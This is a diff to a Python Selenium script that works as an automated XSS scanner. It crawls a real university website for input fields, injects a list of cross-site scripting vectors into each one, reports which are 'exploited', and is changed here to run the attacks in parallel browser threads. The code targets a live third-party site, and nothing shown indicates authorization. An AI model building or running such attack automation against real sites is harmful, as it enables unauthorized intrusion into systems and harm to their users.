@@ -1,4 +1,5 @@
 from selenium import webdriver
+import threading
 from selenium.webdriver.common.keys import Keys
 import pandas as pd
 import matplotlib.pyplot as plt
@@ -6,6 +7,25 @@ from time import sleep
 from progress.bar import Bar
 from bs4 import BeautifulSoup
 import networkx as nx
+
+
+
+
+def chunks_n(lista , n):
+    chunk_size = int(len(lista)/n)
+    print(chunk_size)
+    faltante = len(lista) - (chunk_size*n)
+    print(faltante)
+    chunks = []
+    for i in range(0,n):
+        if(i == n-1):
+            chunk = lista[i*chunk_size : ]
+            chunks.append(chunk)
+        else:
+            chunk = lista[i*chunk_size : (i+1)*chunk_size]
+            chunks.append(chunk)
+    return(chunks)
+
 
 
 
@@ -24,12 +44,16 @@ def get_all_xss_attacks():
     return(vectors)
 
 
-def test_vector(driver , xpath_input_object , attack_chunk):
+def test_vector( xpath_input_object , attack_vector):
+    print("starting thread #{} ".format(threading.current_thread().getName()))
+    driver = webdriver.Chrome()
     url  = xpath_input_object['url']
     xpath = xpath_input_object["xpath"]
-    for i in attack_chunk:
+    driver.get(url)
+    sleep(3)
+    for i in attack_vector:
         try:
-            print("\n testing {} at {} in {}".format(i , xpath , url))
+            print("\n testing {} at {} in {} at thread #{}".format(i , xpath , url , threading.current_thread().getName()))
             driver.get(url)
             sleep(1)
             element = driver.find_element_by_xpath(xpath)
@@ -41,8 +65,20 @@ def test_vector(driver , xpath_input_object , attack_chunk):
                 print("{} exploited in  {} with ".format(url , xpath , i))
         except:
             print("error exploiting {} in {} at {}".format(i , xpath , url))
+    driver.close()
+    print("thread #{} done".format(threading.current_thread().getName()))
 
+def parallel_test_vector(xpath_input_object , attack_vector , n_threads):
+    chunks = chunks_n(attack_vector , n_threads)
+    threads = []
+    for i in range(0 , len(chunks)):
+        t = threading.Thread(target = test_vector , args = (xpath_input_object , chunks[i] ,) , name = "{}".format(i))
+        t.start()
+        threads.append(t)
 
+    #si no hago esto paralelizo todo muy duro y abro como 10.000 browsers
+    for i in threads:
+        i.join()
 
 def get_all_xpath_inputs(driver , url):
     if(driver.current_url != url):
@@ -183,8 +219,9 @@ def get_xpaths_inputs_recursiveley(driver , root_url , depth):
 driver = webdriver.Chrome()
 goal = get_xpaths_inputs_recursiveley(driver , "https://tmedweb.tulane.edu/content_open" , 1)
 xss_vectors = get_all_xss_attacks()
+driver.close()
 for i in goal:
-    test_vector(driver , i , xss_vectors)
+    parallel_test_vector( i , xss_vectors , 4)
 
 print(goal)
 
